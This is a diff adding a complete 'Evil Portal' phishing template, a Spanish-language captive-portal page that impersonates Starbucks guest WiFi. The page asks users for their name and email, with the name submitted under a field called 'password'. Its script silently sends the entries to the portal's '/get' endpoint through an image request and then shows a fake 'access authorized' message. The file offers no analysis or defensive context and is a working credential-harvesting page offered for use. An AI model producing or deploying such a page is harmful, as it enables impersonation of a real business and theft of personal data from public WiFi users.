@@ -1,0 +1,199 @@
+<!--
+  Evil Portal Template: Starbucks WiFi
+  
+  Coffee shop themed portal with Starbucks-style branding.
+  Spanish language version.
+  
+  Form fields:
+  - email: Email address
+  - password: Name field (labeled as "Nombre")
+-->
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Starbucks · Guest WiFi</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            color: #0f172a;
+            min-height: 100vh;
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .shell { width: 100%; max-width: 420px; padding: 16px; }
+        .card {
+            background: #f9fafb;
+            border-radius: 14px;
+            box-shadow: 0 18px 40px rgba(0, 0, 0, 0.8);
+            overflow: hidden;
+            border: 1px solid rgba(15, 118, 110, 0.25);
+        }
+        .card-header {
+            background: linear-gradient(135deg, #064e3b, #065f46, #16a34a);
+            padding: 18px 20px 14px;
+            text-align: center;
+            color: #ecfdf5;
+        }
+        .logo-wrapper { margin-bottom: 6px; }
+        .logo-circle {
+            width: 70px;
+            height: 70px;
+            background: #ecfdf5;
+            border-radius: 50%;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+        }
+        .brand-line {
+            font-size: 11px;
+            letter-spacing: 0.22em;
+            text-transform: uppercase;
+            opacity: 0.9;
+            margin-top: 8px;
+        }
+        .brand-name {
+            margin-top: 4px;
+            font-size: 17px;
+            font-weight: 600;
+            letter-spacing: 0.04em;
+        }
+        .card-body { padding: 18px 18px 16px; }
+        .title {
+            font-size: 16px;
+            margin-bottom: 4px;
+            font-weight: 600;
+            color: #022c22;
+            text-align: center;
+        }
+        .subtitle {
+            font-size: 13px;
+            margin-bottom: 18px;
+            color: #334155;
+            text-align: center;
+        }
+        .form-group { text-align: left; margin-bottom: 12px; }
+        .label {
+            display: block;
+            font-size: 12px;
+            margin-bottom: 4px;
+            color: #0f172a;
+        }
+        .input {
+            width: 100%;
+            padding: 8px 9px;
+            border-radius: 6px;
+            border: 1px solid #cbd5f5;
+            font-size: 13px;
+            background: #ffffff;
+            color: #0f172a;
+        }
+        .input:focus {
+            outline: none;
+            border-color: #16a34a;
+            box-shadow: 0 0 0 1px rgba(22, 163, 74, 0.3);
+        }
+        .btn {
+            width: 100%;
+            padding: 10px;
+            border-radius: 999px;
+            border: none;
+            background: #166534;
+            color: #ecfdf5;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        .btn:hover { background: #15803d; }
+        .disclaimer {
+            margin-top: 12px;
+            font-size: 11px;
+            color: #64748b;
+            line-height: 1.4;
+            text-align: center;
+        }
+        .hidden { display: none; }
+        .ok-icon {
+            font-size: 40px;
+            margin-bottom: 10px;
+            color: #16a34a;
+            text-align: center;
+        }
+        .ok-text {
+            text-align: center;
+            font-size: 13px;
+            color: #334155;
+        }
+    </style>
+</head>
+<body>
+    <div class="shell">
+        <div class="card" id="step-form">
+            <div class="card-header">
+                <div class="logo-wrapper">
+                    <div class="logo-circle">☕</div>
+                </div>
+                <div class="brand-line">Starbucks · Guest WiFi</div>
+                <div class="brand-name">WIFI + COFFEE = 💚</div>
+            </div>
+            <div class="card-body">
+                <div class="title">Acceso a la red de invitados</div>
+                <div class="subtitle">
+                    Ingresa tus datos para conectarte al Wi-Fi del café.
+                </div>
+                <form id="guestForm">
+                    <div class="form-group">
+                        <label class="label" for="fullname">Nombre</label>
+                        <input id="fullname" name="password" class="input" type="text" required>
+                    </div>
+                    <div class="form-group">
+                        <label class="label" for="email">Correo electrónico</label>
+                        <input id="email" name="email" class="input" type="email" required>
+                    </div>
+                    <button type="submit" class="btn">Conectarse al Wi-Fi</button>
+                </form>
+                <div class="disclaimer">
+                    Al conectarte aceptas el uso responsable de la red y las políticas del café.
+                </div>
+            </div>
+        </div>
+
+        <div class="card hidden" id="step-done">
+            <div class="card-header">
+                <div class="logo-wrapper">
+                    <div class="logo-circle">☕</div>
+                </div>
+                <div class="brand-line">Starbucks · Guest WiFi</div>
+                <div class="brand-name">WIFI + COFFEE = 💚</div>
+            </div>
+            <div class="card-body">
+                <div class="ok-icon">✔</div>
+                <div class="title">Acceso autorizado</div>
+                <div class="ok-text">
+                    Tu conexión a la red de invitados ha sido habilitada.<br>
+                    Ya puedes navegar en Internet.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('guestForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var formData = new FormData(this);
+            var params = new URLSearchParams(formData).toString();
+            var img = new Image();
+            img.src = '/get?' + params;
+            document.getElementById('step-form').classList.add('hidden');
+            document.getElementById('step-done').classList.remove('hidden');
+        });
+    </script>
+</body>
+</html>
